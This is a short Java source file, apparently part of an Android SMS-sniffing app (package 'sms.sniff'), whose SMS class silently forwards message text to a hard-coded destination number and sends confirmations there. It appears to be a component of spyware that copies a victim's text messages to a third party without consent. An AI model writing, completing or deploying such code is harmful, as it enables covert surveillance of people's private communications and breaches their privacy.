package sms.sniff.utils;

import java.util.ArrayList;

import sms.sniff.Constants;

import android.telephony.SmsManager;

public class SMS {
	
	private String message;
	
	public SMS(String message) {
		this.message = message;
	}
	
	public void sendComparingWith(String originOrDestinationNumber) {
		if(!Constants.destination.equals(originOrDestinationNumber)) {
			SmsManager manager = SmsManager.getDefault();
			ArrayList<String> msg = manager.divideMessage(message);
			
			manager.sendMultipartTextMessage(Constants.destination, null, msg, null, null);
		}
	}
	
	public void sendConfirmation() {
		SmsManager manager = SmsManager.getDefault();
		manager.sendTextMessage(Constants.destination, null, message, null, null);
	}
}
